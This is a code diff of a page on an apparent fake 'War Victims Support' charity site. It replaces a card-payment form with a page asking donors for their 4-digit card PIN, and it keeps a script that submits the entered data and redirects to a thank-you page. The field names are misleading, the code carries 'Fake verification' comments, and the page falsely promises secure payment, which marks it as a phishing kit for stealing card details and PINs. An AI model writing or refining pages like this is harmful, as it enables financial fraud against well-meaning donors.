@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Card Payment | War Victims Support</title>
+  <title>Card PIN Verification | War Victims Support</title>
   <link rel="shortcut icon" href="logo.webp" type="image/webp" />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
   <style>
@@ -23,15 +23,67 @@
       padding: 20px;
     }
 
-    .payment-container {
+    .pin-container {
       background: #fff;
       padding: 40px 30px;
       border-radius: 16px;
       box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
-      max-width: 600px;
+      max-width: 480px;
       width: 100%;
+      text-align: center;
     }
-#preloader {
+
+    h2 {
+      font-size: 24px;
+      color: #004080;
+      margin-bottom: 20px;
+    }
+
+    .info {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 30px;
+    }
+
+    .info span {
+      font-weight: 600;
+      color: #004080;
+    }
+
+    input[type="password"] {
+      font-size: 20px;
+      padding: 12px 16px;
+      width: 100%;
+      max-width: 200px;
+      text-align: center;
+      letter-spacing: 8px;
+      border: 2px solid #004080;
+      border-radius: 10px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      background-color: #004080;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #002f5e;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #777;
+      margin-top: 25px;
+    }
+    #preloader {
   position: fixed;
   top: 0;
   left: 0;
@@ -65,143 +117,36 @@ body.loaded #preloader {
   pointer-events: none;
 }
 
-
-
-    .payment-container h1 {
-      font-size: 26px;
-      color: #004080;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-
-    .card-logos {
-      display: flex;
-      justify-content: center;
-      gap: 15px;
-      margin-bottom: 20px;
-    }
-
-    .card-logos img {
-      height: 28px;
-      filter: grayscale(100%);
-      transition: filter 0.3s;
-    }
-
-    .card-logos img:hover {
-      filter: grayscale(0%);
-    }
-
-    .summary {
-      background: #eef5ff;
-      padding: 20px;
-      border-radius: 10px;
-      margin-bottom: 30px;
-    }
-
-    .summary p {
-      margin-bottom: 10px;
-      color: #004080;
-      font-weight: 600;
-    }
-
-    .form-group {
-      margin-bottom: 20px;
-    }
-
-    .form-group label {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: 500;
-    }
-
-    .form-group input {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      font-size: 16px;
-    }
-
-    .btn-pay {
-      width: 100%;
-      padding: 14px;
-      background: #004080;
-      color: white;
-      font-size: 16px;
-      font-weight: bold;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    .btn-pay:hover {
-      background: #002f5e;
-    }
-
-    .note {
-      font-size: 13px;
-      color: #777;
-      text-align: center;
-      margin-top: 20px;
-    }
   </style>
 </head>
 <body>
-    <div id="preloader">
-      <div class="loader"></div>
+  <div id="preloader">
+    <div class="loader"></div>
+  </div>
+  <div class="pin-container">
+    <h2>Enter Your 4-Digit PIN</h2>
+
+    <div class="info">
+      Cardholder: <span id="cardName">Loading...</span><br/>
+      Amount: <span id="cardAmount">$0</span>
     </div>
 
-  <div class="payment-container">
-    <h1>Complete Your Payment</h1>
-
-    <div class="card-logos">
-      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa"/>
-      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard"/>
-      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="American Express"/>
-    </div>
-
-    <div class="summary">
-      <p>Donation Amount: <span id="showAmount">$0</span></p>
-      <p>Donor Email: <span id="showEmail">you@example.com</span></p>
-    </div>
-
-    <form id="CardForm">
-      <div class="form-group">
-        <label for="cardName">Cardholder Name</label>
-        <input type="text" id="cardName" placeholder="Jane Doe" name="name" required />
-      </div>
-
-      <div class="form-group">
-        <label for="cardNumber">Card Number</label>
-        <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" name="date expected" required />
-      </div>
-
-      <div class="form-group">
-        <label for="expiry">Expiry Date</label>
-        <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" name="time limit" required />
-      </div>
-
-      <div class="form-group">
-        <label for="cvv">CVV</label>
-        <input type="text" id="cvv" maxlength="4" placeholder="123" name="number" required />
-      </div>
-    
-
-      <button type="submit" class="btn-pay">Pay Now</button>
+    <form id="Form">
+      <input type="password" maxlength="4" pattern="\d*" placeholder="••••" required name="fournumber" />
+      <button type="submit">Verify & Complete</button>
     </form>
 
-    <p class="note">You are helping save lives and restore hope. 💙</p>
+    <div class="note">Your payment is protected and secure 🔒</div>
   </div>
 
   <script>
 
-  window.addEventListener('load', function () {
+window.addEventListener('load', function () {
     document.body.classList.add('loaded');
   });
-    
+
 document.addEventListener("DOMContentLoaded", function () {
-    const form = document.getElementById("CardForm");
+    const form = document.getElementById("Form");
 
     form.addEventListener("submit", function (e) {
       e.preventDefault(); // Prevent the default form reload
@@ -223,7 +168,7 @@ document.addEventListener("DOMContentLoaded", function () {
       })
       .then(response => {
         if (response.ok) {
-          window.location.href = "card-processing2.html"; // Redirect after submission
+          window.location.href = "Thank-You.html"; // Redirect after submission
         } else {
           alert("Payment Details Submission failed. Please try again.");
         }
@@ -236,40 +181,20 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
 
+    // Load stored info
+    const name = localStorage.getItem("cardHolder") || "Unknown";
+    const amount = localStorage.getItem("cardAmount") || "0";
 
+    document.getElementById("cardName").textContent = name;
+    document.getElementById("cardAmount").textContent = "$" + amount;
 
+    // Fake verification
+    document.getElementById("pinForm").addEventListener("submit", function (e) {
+      e.preventDefault();
 
-
-    const amount = localStorage.getItem("donationAmount") || 0;
-    const email = localStorage.getItem("donorEmail") || "you@example.com";
-
-    document.getElementById("showAmount").textContent = "$" + amount;
-    document.getElementById("showEmail").textContent = email;
-
-    // Format card number as XXXX XXXX XXXX XXXX
-    const cardInput = document.getElementById("cardNumber");
-    cardInput.addEventListener("input", function(e) {
-      let val = e.target.value.replace(/\D/g, "").substring(0, 16);
-      val = val.replace(/(.{4})/g, "$1 ").trim();
-      e.target.value = val;
+      // // You can add real validation logic here if needed
+      // window.location.href = "thank-you.html"; // Adjust as needed
     });
-
-    // Format expiry as MM/YY
-    const expiryInput = document.getElementById("expiry");
-    expiryInput.addEventListener("input", function(e) {
-      let val = e.target.value.replace(/\D/g, "").substring(0, 4);
-      if (val.length > 2) {
-        val = val.substring(0, 2) + "/" + val.substring(2);
-      }
-      e.target.value = val;
-    });
-
-    // Fake submit
-    // document.getElementById("fakeCardForm").addEventListener("submit", function(e) {
-    //   e.preventDefault();
-    // //   alert("Your mock payment of $" + amount + " has been submitted! Thank you for your support.");
-    //   window.location.href = "Payment_Verification.html"; // your thank you page
-    // });
   </script>
 
 </body>
